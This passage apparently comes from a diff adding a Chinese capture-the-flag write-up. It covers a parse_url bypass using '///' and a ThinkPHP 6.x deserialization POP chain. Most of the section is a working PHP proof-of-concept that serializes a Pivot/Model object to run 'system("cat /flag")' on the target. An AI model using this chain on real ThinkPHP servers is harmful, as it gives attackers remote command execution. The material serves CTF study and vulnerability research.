@@ -277,3 +277,75 @@ echo base64_decode($userinfo['img']);
 
 返回了flag地址，再读一次就可
 
+## I am thinking(赛后复现)
+
+其实就是个parse_url的绕过+tp6.0POP
+
+TP6.x POP Poc
+```
+<?php
+namespace think\model\concern;
+trait Conversion
+{
+}
+
+trait Attribute
+{
+    private $data;
+    private $withAttr = ["eki" => "system"];
+
+    public function get()
+    {
+        $this->data = ["eki" => "cat /flag"];  //你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可
+    }
+}
+
+namespace think;
+abstract class Model{
+    use model\concern\Attribute;
+    use model\concern\Conversion;
+    private $lazySave = false;
+    protected $withEvent = false;
+    private $exists = true;
+    private $force = true;
+    protected $field = [];
+    protected $schema = [];
+    protected $connection='mysql';
+    protected $name;
+    protected $suffix = '';
+    function __construct(){
+        $this->get();
+        $this->lazySave = true;
+        $this->withEvent = false;
+        $this->exists = true;
+        $this->force = true;
+        $this->field = [];
+        $this->schema = [];
+        $this->connection = 'mysql';
+    }
+
+}
+
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+{
+    function __construct($obj='')
+    {
+        parent::__construct();
+        $this->name = $obj;
+    }
+}
+$a = new Pivot();
+$b = new Pivot($a);
+
+echo urlencode(serialize($b));
+```
+
+
+parse_url用``///``绕过
+### 参考资料
+
+https://www.anquanke.com/post/id/187393
